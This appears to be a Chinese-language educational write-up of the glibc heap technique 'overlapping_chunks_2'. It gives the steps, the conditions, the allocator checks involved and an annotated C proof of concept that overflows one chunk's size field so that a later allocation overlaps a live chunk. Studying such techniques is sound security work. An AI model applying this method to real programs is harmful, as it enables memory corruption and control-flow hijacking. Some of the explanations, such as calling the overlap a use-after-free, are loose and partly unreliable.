# 漏洞利用文档：overlapping_chunks_2

## 攻击对象
- **目标内存位置**: p2 chunk 的 size 字段（地址 `0x6033f8`）。这是堆元数据的一部分，用于定义 chunk 的大小和状态（如 prev_inuse 位）。
- **具体影响**: 通过修改 size 字段，欺骗 glibc 分配器，使其错误计算 chunk 边界，导致非相邻 chunk 的错误合并。

## 利用过程
1. **初始分配**: 分配 5 个 chunk（p1 到 p5），每个约 1000 字节，填充数据以初始化内存。
2. **释放 p4**: 释放 p4，使其进入 unsorted bin，为后续攻击准备空闲 chunk。
3. **堆溢出修改**: 通过 p1 的溢出漏洞，覆盖 p2 的 size 字段，将其大小改为包含 p3 的空间（原始大小 + p3 大小 + 元数据开销）。
4. **释放 p2**: 释放 p2，分配器被欺骗，错误地将 p2 和 p3 视为一个连续的大空闲 chunk，并放入 unsorted bin。
5. **分配 p6**: 分配一个大 chunk（p6，2000 字节），从错误合并的 chunk 中分配，导致 p6 和 p3 的内存区域重叠。
6. **数据篡改**: 通过 p6 写入数据（如填充 'F'），覆盖 p3 的内容，演示 UAF 和数据控制。

## 利用条件
- **堆溢出写**: p1 存在溢出漏洞，允许写入超出其分配边界，覆盖相邻 p2 的 size 字段。
- **Use-After-Free (UAF)**: 释放 p2 后，分配 p6 时重用被错误合并的内存，导致 p3（仍在使用）与 p6 重叠。
- **chunk 布局控制**: 需要特定 chunk 分配顺序（p1、p2、p3 等相邻），且 p4 被释放以创建 unsorted bin 条目。
- **元数据绕过**: 修改 size 时需正确设置 prev_inuse 位（此处为 0x1），以通过 glibc 的分配器检查。

## 利用效果
- **Use-After-Free (UAF)**: p3 和 p6 重叠，允许通过 p6 修改 p3 的数据，破坏程序逻辑。
- **数据篡改**: 攻击者可控制 p3 的内容，可能导致信息泄露、控制流劫持（如覆盖函数指针）或进一步攻击（如 ROP）。
- **任意地址分配**: 通过操纵 unsorted bin，可间接影响后续 malloc 分配，但本例中主要用于重叠而非直接任意地址分配。

## 涉及缓解机制
- **glibc 堆元数据检查**: 在 free 操作时，glibc 会检查 chunk 完整性。例如，在 `_int_free` 函数（malloc.c）中，有对 size 和 next chunk 的检查：
  - 检查 size 是否有效（最小大小、对齐等）: 
    ```c
    if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
      malloc_printerr ("free(): invalid size");
    ```
  - 检查 next chunk 的 prev_size 是否与当前 size 匹配（在合并时）: 
    ```c
    if (nextchunk != av->top) {
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
      if (!nextinuse) {
        unlink(av, nextchunk, bck, fwd); //  unlink 操作会检查双向链表完整性
      }
    }
    ```
  - **绕过原理**: 在本攻击中，通过溢出修改 p2 的 size 为 `real_size_p2 + real_size_p3 + prev_inuse + sizeof(size_t)*2`，使得 next chunk（错误指向 p4）的 prev_size 不直接验证，因为 prev_inuse 位被设置为 1（避免合并检查），从而欺骗分配器。

## Proof of Concept
以下是漏洞利用原型的源码，添加了中文注释以解释关键步骤：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main(){
  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use = 0x1; // 设置 prev_inuse 位为 1，表示前一个 chunk 在使用中

  fprintf(stderr, "\nThis is a simple chunks overlapping problem");
  fprintf(stderr, "\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n");
  fprintf(stderr, "\nLet's start to allocate 5 chunks on the heap:");

  // 分配 5 个 chunk，每个约 1000 字节
  p1 = malloc(1000);
  p2 = malloc(1000);
  p3 = malloc(1000);
  p4 = malloc(1000);
  p5 = malloc(1000);

  // 获取实际可用大小（包括元数据开销）
  real_size_p1 = malloc_usable_size(p1);
  real_size_p2 = malloc_usable_size(p2);
  real_size_p3 = malloc_usable_size(p3);
  real_size_p4 = malloc_usable_size(p4);
  real_size_p5 = malloc_usable_size(p5);

  fprintf(stderr, "\n\nchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
  fprintf(stderr, "\nchunk p2 from %p to %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
  fprintf(stderr, "\nchunk p3 from %p to %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
  fprintf(stderr, "\nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
  fprintf(stderr, "\nchunk p5 from %p to %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));

  // 填充数据以初始化内存，便于后续观察
  memset(p1,'A',real_size_p1);
  memset(p2,'B',real_size_p2);
  memset(p3,'C',real_size_p3);
  memset(p4,'D',real_size_p4);
  memset(p5,'E',real_size_p5);
  
  fprintf(stderr, "\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"); 
  free(p4); // 释放 p4，使其进入 unsorted bin，为攻击做准备

  fprintf(stderr, "\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n");

  // 关键漏洞利用步骤：通过 p1 溢出修改 p2 的 size 字段
  // real_size_p1 是 p1 的可用大小，p1 + real_size_p1 指向 p2 的 size 字段
  // 计算新 size：p2 原始大小 + p3 大小 + prev_inuse 位 + 元数据开销（2 * sizeof(size_t)）
  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE 堆溢出写漏洞

  fprintf(stderr, "\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n");
  fprintf(stderr, "\nThis operation will basically create a big free chunk that wrongly includes p3\n");
  free(p2); // 释放 p2，分配器被欺骗，错误合并 chunk

  fprintf(stderr, "\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n");
  p6 = malloc(2000); // 分配 p6，从错误合并的 chunk 中获取内存，与 p3 重叠
  real_size_p6 = malloc_usable_size(p6);

  fprintf(stderr, "\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n");
  fprintf(stderr, "\nchunk p6 from %p to %p", p6,  (unsigned char *)p6+real_size_p6);
  fprintf(stderr, "\nchunk p3 from %p to %p\n", p3, (unsigned char *) p3+real_size_p3); 

  fprintf(stderr, "\nData inside chunk p3: \n\n");
  fprintf(stderr, "%s\n",(char *)p3); // 输出 p3 的原始内容

  fprintf(stderr, "\nLet's write something inside p6\n");
  memset(p6,'F',1500);  // 通过 p6 写入数据，覆盖 p3 的部分内容，演示 UAF

  fprintf(stderr, "\nData inside chunk p3: \n\n");
  fprintf(stderr, "%s\n",(char *)p3); // 输出被修改后的 p3 内容，显示攻击成功
}
```

### 注释说明
- **关键漏洞点**: 第 51 行左右的溢出写操作，修改 p2 的 size，是攻击的核心。
- **利用效果验证**: 最后通过 memset 和输出显示 p3 被覆盖，证明 UAF 和重叠成功。
- **编译运行建议**: 使用 gcc 编译（如 `gcc -o overlapping overlapping_chunks_2.c`），并在调试器（如 gdb）中运行以观察内存变化。调试记录显示地址可能因环境而异，但逻辑一致。